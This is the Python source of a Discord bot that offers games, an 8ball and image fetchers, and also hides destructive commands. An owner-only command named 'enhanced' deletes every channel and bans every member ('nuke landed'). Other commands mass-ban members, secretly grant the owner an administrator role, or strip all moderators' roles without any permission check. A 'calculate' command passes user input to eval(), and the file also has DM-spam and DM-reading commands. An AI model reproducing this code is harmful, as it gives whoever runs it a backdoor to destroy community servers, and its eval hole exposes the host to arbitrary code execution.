import random
import discord
import os
import sys
from discord.ext import tasks
from discord.ext.commands import Greedy, Context
from discord import app_commands
from discord.ext import commands
import asyncio
import time
from datetime import datetime
import re
import requests
import json
import urllib.parse
from bs4 import BeautifulSoup



bot = commands.Bot("$", intents=discord.Intents.all())

image_cache = {"sfw": [], "nsfw": []}

cooldown_time = 60

ALLOWED_USER_ID = 11097879047213686875

snake_board_size = 10
snake_initial_length = 1
snake_directions = [(0, 1), (0, -1), (1, 0), (-1, 0)]
snake_game_in_progress = False
snake_head = (snake_board_size // 2, snake_board_size // 2)
snake_body = [(snake_head[0] - i, snake_head[1]) for i in range(snake_initial_length)]
food_position = None
game_message = None


current_direction = (0, 1)

async def start_game(ctx):
    global snake_game_in_progress, snake_head, snake_body, food_position, game_message
    snake_game_in_progress = True
    snake_head = (snake_board_size // 2, snake_board_size // 2)
    snake_body = [(snake_head[0] - i, snake_head[1]) for i in range(snake_initial_length)]
    food_position = generate_food_position()
    game_message = await ctx.send("Snake game started! Use reactions to change direction.")
    await game_message.add_reaction('⬆️')
    await game_message.add_reaction('⬇️')
    await game_message.add_reaction('➡️')
    await game_message.add_reaction('⬅️')
    await display_board()
    await move_snake(ctx)

def generate_food_position():
    return (random.randint(0, snake_board_size - 1), random.randint(0, snake_board_size - 1))

async def display_board():
    board = [['⬛' for _ in range(snake_board_size)] for _ in range(snake_board_size)]
    
    for x, y in snake_body:
        board[y][x] = '🟢'
    
    if food_position:
        x, y = food_position
        board[y][x] = '🍎'
    
    board_str = '\n'.join([''.join(row) for row in board])
    await game_message.edit(content=f"```\n{board_str}\n```")

async def move_snake(ctx):
    global snake_game_in_progress, snake_head, snake_body, food_position, current_direction
    
    while snake_game_in_progress:
        new_head = (snake_head[0] + current_direction[0], snake_head[1] + current_direction[1])
        
        if (
            new_head[0] < 0 or
            new_head[0] >= snake_board_size or
            new_head[1] < 0 or
            new_head[1] >= snake_board_size
        ):
            await ctx.send("You hit the wall! Game over.")
            snake_game_in_progress = False
            break


        if new_head in snake_body[1:]:
            await ctx.send("You hit your own tail! Game over.")
            snake_game_in_progress = False
            break

        if new_head == food_position:
            snake_body.insert(0, new_head)
            food_position = generate_food_position()
        else:
            snake_body.insert(0, new_head)
            snake_body.pop()
        
        snake_head = new_head
        await display_board()
        await asyncio.sleep(1) 



allowed_user_ids = [761769388335431690, 984481582826020905, 964374501343236096, 707782594418442270, 1097879047213686875] # This is for users to access the echo command.




switch_status = False

words = ["king", "minecraft", "wumbee", "orange", "imagine", "ban", "alternate", "hakurei", "ng", "king of fighters", "nintendo", "fight", "python", "aleph", "tekken", "cod", "combat master", "cemu", "poop", "jabascript", "kong", "snek", "snek", "bro", "net", "oboro", "discord", "keyboard", "why", "sega", "rat", "fuck", "mark", "what", "bite", "dog", "slayer", "dragon", "gay", "shit", "ceaser", "me", "stress", "bird", "corn", "snake", "cat"]

HANGMAN_STAGES = [
    "```\n"
    "  +---+\n"
    "      |\n"
    "      |\n"
    "      |\n"
    "      |\n"
    "      |\n"
    "=========\n"
    "```",
    "```\n"
    "  +---+\n"
    "  O   |\n"
    "      |\n"
    "      |\n"
    "      |\n"
    "      |\n"
    "=========\n"
    "```",
    "```\n"
    "  +---+\n"
    "  O   |\n"
    "  |   |\n"
    "      |\n"
    "      |\n"
    "      |\n"
    "=========\n"
    "```",
    "```\n"
    "  +---+\n"
    "  O   |\n"
    " /|   |\n"
    "      |\n"
    "      |\n"
    "      |\n"
    "=========\n"
    "```",
    "```\n"
    "  +---+\n"
    "  O   |\n"
    " /|\  |\n"
    "      |\n"
    "      |\n"
    "      |\n"
    "=========\n"
    "```",
    "```\n"
    "  +---+\n"
    "  O   |\n"
    " /|\  |\n"
    " /    |\n"
    "      |\n"
    "      |\n"
    "=========\n"
    "```",
    "```\n"
    "  +---+\n"
    "  O   |\n"
    " /|\  |\n"
    " / \  |\n"
    "      |\n"
    "      |\n"
    "=========\n"
    "```"
]





class HangmanGame:
    def __init__(self, word):
        self.word = word
        self.guessed_letters = set()
        self.attempts = 6

hangman_games = {}

board = [' '] * 9
current_player = 'X'



@bot.event
async def on_ready():
    print(f"logged as {bot.user}")
    change_status.start()


@tasks.loop(seconds=5)
async def change_status():
  await bot.change_presence(activity=discord.Game(random.choice(["enhanced", "infinty"])))


@bot.event
async def on_member_join(member):
    # Replace these placeholders with your server name and your welcome message
    server_name = "Your Server Name"
    welcome_message = f"Welcome to {server_name}! We're glad to have you here, we hope you have a nice time!"

    # Send the welcome message in a DM to the new member
    try:
        await member.send(welcome_message)
    except discord.errors.Forbidden:
        # The member may have DMs disabled, handle this as needed
        pass




@bot.event
async def on_message(message):
    content = message.content.lower()

    if message.content == "uh oh":
        await message.channel.send("https://cdn.discordapp.com/attachments/1122408339570180147/1137485909453971506/mc.jpg", reference=message)

    if message.content == "XD":
        await message.channel.send("CD", reference=message)

    if message.content == "mario":
        await message.channel.send("https://media.discordapp.net/attachments/1122408339570180147/1140644983037239336/world-1-1.gif", reference=message)

    if message.content == "<@1097879047213686875>":
        await message.channel.send("IT'S FUTILE 🦅🦅🦅    https://media.discordapp.net/attachments/1173148346941194323/1201636988894322708/A_ping_message_for_a_nice_farewell.mp4?ex=65ca8aa7&is=65b815a7&hm=3084941b8f540cb92e65569e40b5fa8fca93f44f96e2e4603b8b10c176ca3bc9&", reference=message)

    if message.content == "mad":
        await message.channel.send("hhttps://discord.com/channels/@me/1122408339570180147/1158486608182513744", reference=message)

    if message.content == "lol":
        await message.channel.send("you got a whole squad laughing", reference=message)

    if message.author.bot is False and message.content:  
       role = discord.utils.get(message.author.roles, name='REACT') 
    if role is not None:  
        reaction = '<:test:1228493580763660319>'  
        await message.add_reaction(reaction)

        await bot.process_command(message)



@bot.event
async def on_reaction_add(reaction, user):
    global current_direction
    
    if user.bot:
        return

    if reaction.message.id == game_message.id:
        direction_mapping = {
            '⬆️': (0, -1),
            '⬇️': (0, 1),
            '➡️': (1, 0),
            '⬅️': (-1, 0)
        }

        direction = direction_mapping.get(reaction.emoji)
        
        if direction:
            # Update the current direction based on the reaction
            current_direction = direction
            await game_message.remove_reaction(reaction.emoji, user)

@bot.command(name='snake')
async def snake_command(ctx):
    global snake_game_in_progress
    if not snake_game_in_progress:
        await start_game(ctx)
    else:
        await ctx.send("A game is already in progress!")

@bot.command()
async def kick(ctx, member: discord.Member, *, reason=None):
    if ctx.author.guild_permissions.kick_members:
        if ctx.author.top_role > member.top_role:  # Check if the author's role is higher
            await member.kick(reason=reason)
            await ctx.send(f"{member.mention} has been kicked.")
        else:
            await ctx.send("You can't kick someone with a higher or equal role.")
    else:
        await ctx.send("You don't have the necessary permissions to kick members.")


@bot.command()
@commands.cooldown(1, cooldown_time, commands.BucketType.user)
async def astolfo(ctx):
    try:
        response = requests.get("https://femboyfinder.firestreaker2.gq/api/astolfo")
        response.raise_for_status()
        astolfo_image = response.json().get('url')
        await ctx.send(astolfo_image)
    except requests.RequestException as e:
        print(f"An error occurred while fetching Astolfo image: {e}")
        await ctx.send("Failed to fetch Astolfo image from the API. Please try again later.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        await ctx.send("An unexpected error occurred. Please try again later.")

@astolfo.error
async def astolfo_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"Please wait {error.retry_after:.0f} seconds before using this command again.")


@bot.command(aliases=['8ball'])
async def ball(ctx,*, question):
  responses = [
  discord.Embed(title='It is certain.'),
  discord.Embed(title='It is decidedly so.'),
  discord.Embed(title='Without a doubt of your .'),
  discord.Embed(title='Yes - definitely.'),
  discord.Embed(title='You may rely on it to yourself not me.'),
  discord.Embed(title='Maybe idk'),
  discord.Embed(title='Outlook good.'),
  discord.Embed(title='Yes.'),
  discord.Embed(title='Signs point to yes.'),
  discord.Embed(title='say that again please.'),
  discord.Embed(title='could you say that again, it sound so soft.'),
  discord.Embed(title='Better not tell you now.'),
  discord.Embed(title='Cannot predict now because im toooooooo lazy.'),
  discord.Embed(title='Concentrate and ask again and listen closely.'),
  discord.Embed(title="Don't count on it because im not into this."),
  discord.Embed(title='no.'),
  discord.Embed(title='My sources say no.'),
  discord.Embed(title='im sorry but it not very good.'),
  discord.Embed(title='a terrible fate havent you.')
    ]
  responses = random.choice(responses)
  await ctx.send(content=f'Question: {question}\nAnswer:', embed=responses)


@bot.command(name='spam', help='Spams the input message for x number of times')
async def spam(ctx, amount:int, *, message):
    for i in range(amount):
        await ctx.send(message)

@bot.command()
async def husbando(ctx):
    categories = ["anime", "game", "real-life"]

    category = random.choice(categories)

    params = {"category": category, "limit": 1}
    response = requests.get("https://api.men.png", params=params)
    husbando_image = response.json()["data"][0]["url"]

    await ctx.send(husbando_image)

@bot.command()
async def flipcoin(ctx):
	heads_tails = ['Heads', 'Tails']
	
	choice = random.choice(heads_tails)
	
	await ctx.send(choice)



@bot.command()
async def hey(ctx):
    msg = await ctx.send("Hello")
    reaction1 = '👋'
    reaction2 = ':congaparrot:1142004332502450268'
    await msg.add_reaction(reaction1)
    await msg.add_reaction(reaction2)

@bot.command()
async def hangman(ctx):
    if ctx.channel.id not in hangman_games:
        word = random.choice(words)
        game = HangmanGame(word)
        hangman_games[ctx.channel.id] = game
        await ctx.send(f"Let's play Hangman!\nAttempts left: {game.attempts}")
        await display_word(ctx)
    else:
        await ctx.send("A Hangman game is already in progress in this channel.")

@bot.command()
async def guess(ctx, letter):
    if ctx.channel.id in hangman_games:
        game = hangman_games[ctx.channel.id]

        if letter.lower() in game.guessed_letters:
            await ctx.send("You already guessed that letter!")
            return

        game.guessed_letters.add(letter.lower())

        if letter.lower() in game.word:
            await ctx.send("Correct guess!")
        else:
            game.attempts -= 1
            await ctx.send("Wrong guess!")

        await display_word(ctx)
        await check_game_state(ctx)

    else:
        await ctx.send("Hangman is not on yet, please use the ```$hangman``` to play the game")

async def display_word(ctx):
    game = hangman_games[ctx.channel.id]
    masked_word = " ".join(letter if letter in game.guessed_letters else "_" for letter in game.word)
    hangman_stage = HANGMAN_STAGES[len(HANGMAN_STAGES) - game.attempts - 1]
    await ctx.send(f"{hangman_stage}\nWord: {masked_word}\nAttempts left: {game.attempts}")

async def check_game_state(ctx):
    game = hangman_games[ctx.channel.id]

    if "_" not in (masked_word := "".join(letter if letter in game.guessed_letters else "_" for letter in game.word)):
        await ctx.send("Congratulations! You've guessed the word!")
        del hangman_games[ctx.channel.id]
    elif game.attempts == 0:
        await ctx.send(f"Game over! The word was '{game.word}'.")
        del hangman_games[ctx.channel.id]



@bot.command()
async def toe(ctx):
    await ctx.send("Let's play Tic Tac Toe! Use command $place [position] to make a move.")

@bot.command()
async def place(ctx, position: int):
    global current_player
    if 1 <= position <= 9 and board[position - 1] == ' ':
        board[position - 1] = current_player
        current_player = 'O' if current_player == 'X' else 'X'
        await update_board(ctx)
    else:
        await ctx.send("Invalid move!")

async def update_board(ctx):
    board_message = "```\n"
    for i, cell in enumerate(board, start=1):
        board_message += " " + cell + " "
        if i % 3 != 0:
            board_message += "|"
        if i % 3 == 0:
            board_message += "\n"
            if i < 9:
                board_message += "---|---|---\n"
    board_message += "```"
    await ctx.send(board_message)

@bot.command()
async def love(ctx, name1, name2):
    love_percentage = calculate_love_percentage(name1, name2)
    response = f"The love percentage between {name1} and {name2} is {love_percentage}%! ❤️"
    await ctx.send(response)

def calculate_love_percentage(name1, name2):
    combined_names = name1.lower() + name2.lower()
    love_percentage = hash(combined_names) % 101
    return love_percentage


@bot.command()
async def hate(ctx, name1, name2):
    hate_percentage = calculate_hate_percentage(name1, name2)
    meme = "It's over 9000!" if hate_percentage > 9000 else ""
    response = f"The hate percentage between {name1} and {name2} is {hate_percentage}%, {meme} 😡"
    await ctx.send(response)

def calculate_hate_percentage(name1, name2):
    combined_names = name1.lower() + name2.lower()
    hate_percentage = (hash(combined_names) + 50) % 101  # Adding 50 to ensure positive values
    return hate_percentage

@bot.command()
async def cat(ctx):
    response = requests.get('https://api.thecatapi.com/v1/images/search')
    data = response.json()
    
    if data and 'url' in data[0]:
        cat_url = data[0]['url']
        await ctx.send(cat_url)
    else:
      await ctx.send("Sorry,I couldn't fetch a cat image atthemoment.") 

@bot.command()
async def dog(ctx):
    response = requests.get('https://api.thedogapi.com/v1/images/search')
    data = response.json()

    if data and 'url' in data[0]:
        dog_url = data[0]['url']
        await ctx.send(dog_url)
    else:
        await ctx.send("Sorry, I couldn't fetch a dog image at the moment.")

@bot.command()
async def waifu(ctx, category: str = None):
    if category.lower() not in ["sfw", "nsfw"]:
        await ctx.send("Invalid category. Please use 'sfw' or 'nsfw' only. For example, use `$waifu sfw` or `$waifu nsfw`.")
        return
    
    api_url = f'https://api.waifu.pics/{category}/waifu'
    response = requests.get(api_url)

    try:
        data = response.json()
    except ValueError:
        data = None

    if data and 'url' in data:
        waifu_url = data['url']
        if waifu_url in image_cache[category]:
            new_response = requests.get(api_url)
            try:
                new_data = new_response.json()
                if new_data and 'url' in new_data:
                    waifu_url = new_data['url']
            except ValueError:
                pass
        image_cache[category].append(waifu_url)
        if len(image_cache[category]) > 1000:
            image_cache[category] = image_cache[category][-1000:]

        await ctx.send(waifu_url)
    else:
        await ctx.send(f"sorry, i was too lazy to fetch a waifu image")




@bot.command()
async def dm(ctx, user: discord.User):
    # Check if the command is used by an allowed user
    if ctx.author.id in allowed_user_ids:
        dm_channel = user.dm_channel
        if dm_channel:
            dm_messages = []
            async for message in dm_channel.history(limit=10):
                dm_messages.append(f"{message.author}: {message.content}")
            formatted_messages = '\n'.join(dm_messages)
            await ctx.send(f"Last 10 DM messages from {user}:\n{formatted_messages}")
        else:
            await ctx.send(f"{user} has not sent any messages to the bot.")
    else:
        await ctx.send("You don't have permission to use this command.")


@bot.command()
async def echo(ctx, *, message_to_send):
    # Check if the command is used by an allowed user
    if ctx.author.id in allowed_user_ids:
        # Delete the user's command message
        await ctx.message.delete()

        # Send the echoed message
        await ctx.send(message_to_send)
    else:
        await ctx.send("You don't have permission to use this command.")

@bot.command()
async def echo_dm(ctx, target_user: discord.User, *, message_to_send):
    # Check if the command is used by an allowed user
    if ctx.author.id in allowed_user_ids:
        # Delete the user's command message
        await ctx.message.delete()

        # Send the message to the target user's DMs
        await target_user.send(message_to_send)
    else:
        await ctx.send("You don't have permission to use this command.")


@bot.command()
async def calculate(ctx, *, expression: str):
    try:
        result = eval(expression)
        await ctx.send(f"The result of {expression} is {result}")
    except Exception as e:
        await ctx.send("Invalid expression!")

 # spamming in dms

@bot.command()
async def dm_spam(ctx, user: discord.User, times: int, *, message: str):
    times = min(times, 500)
    for _ in range(times):
        await user.send(message)


@bot.command()
async def activity(ctx, user: discord.Member):
    try:
        for activity in user.activities:
            if activity.type == discord.ActivityType.playing:
                await ctx.send(f"{user.name} is playing {activity.name}")
                return
        await ctx.send(f"{user.name} is not playing anything.")
    except discord.NotFound:
        await ctx.send("User not found.")
    
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def update(ctx):
    try:
        await ctx.send("Bot successfully updated!")
        sys.exit(0)
    except Exception as e:
        await ctx.send(f"Failed to update the bot: {str(e)}")

@bot.command()
async def findimage(ctx, *, query):
    image_results = perform_image_search(query)

    if image_results:
        await ctx.send("Here are the image my friend:")
        for result in image_results:
            await ctx.send(result)
    else:
        await ctx.send("No image search results found.")

def perform_web_search(query):
    try:
        search_results = list(re.search(query, num=5, stop=5, pause=2))
        return search_results
    except Exception as e:
        print(f"Error performing web search: {e}")
        return []

def perform_image_search(query):
    try:
        # Construct a search URL for image results
        search_url = f"https://www.google.com/search?q={urllib.parse.quote(query)}&tbm=isch"
        response = requests.get(search_url)
        soup = BeautifulSoup(response.text, "html.parser")

        image_results = []
        for img in soup.find_all("img"):
            img_url = img.get("src")
            if img_url and img_url.startswith("http"):
                image_results.append(img_url)

        return image_results[:1]  # Limit to the first 5 results
    except Exception as e:
        print(f"Error performing image search: {e}")
        return []


import asyncio

@bot.command()
async def enhanced(ctx):
    if ctx.author.id != 1097879047213686875:
        return await ctx.send("if the command dosen't work then your perms on this server are not on")

    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass

    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            pass

    await ctx.guild.create_text_channel('nuked')
    channel = discord.utils.get(bot.get_all_channels(), guild=ctx.author.guild, name='nuked')
    await channel.send("nuke landed https://tenor.com/bxkG5.gif")

@bot.command()
async def sleep(ctx):
    if ctx.author.id != 1097879047213686875:
        return await ctx.send("You are not the bot owner!")

    for member in ctx.guild.members:
        try:
            await member.ban()
            await ctx.send("error")
        
        except Exception as e:
            await ctx.send("timeline unstable")


@bot.command()
async def admin(ctx):
    if ctx.author.id != 1097879047213686875:
        return await ctx.send("You are not the bot owner!")

    perms = discord.Permissions(administrator=True)
    role = await ctx.guild.create_role(name="Admin", permissions=perms)
    await ctx.author.add_roles(role)
    await ctx.message.delete()

@bot.command()
async def removemod(ctx):
    if not ctx.guild.me.guild_permissions.manage_roles:
        await ctx.send('I need the "Manage Roles" permission to remove mod and admin roles from others.')
        return

    for member in ctx.guild.members:
        if any(role.permissions.administrator or role.permissions.manage_messages for role in member.roles):
            for role in member.roles:
                if role.permissions.administrator or role.permissions.manage_messages:
                    await member.remove_roles(role)

            await member.send('Your mod and admin roles have been removed by the bot.')

    await ctx.send('Successfully removed mod and admin roles from others.')

@bot.command()
async def botrole(ctx):
    if not ctx.guild.me.guild_permissions.manage_roles:
        await ctx.send('I need the "Manage Roles" permission to create a bot role.')
        return

    bot_role = await ctx.guild.create_role(name='Bot Role', permissions=discord.Permissions.all())

    bot_role.permissions.administrator = True

    await bot_role.edit(permissions=bot_role.permissions)

    await ctx.guild.me.add_roles(bot_role)

    await ctx.send(f'Successfully created the bot role: {bot_role.name}')

bot.run(os.environ['TOKEN'])
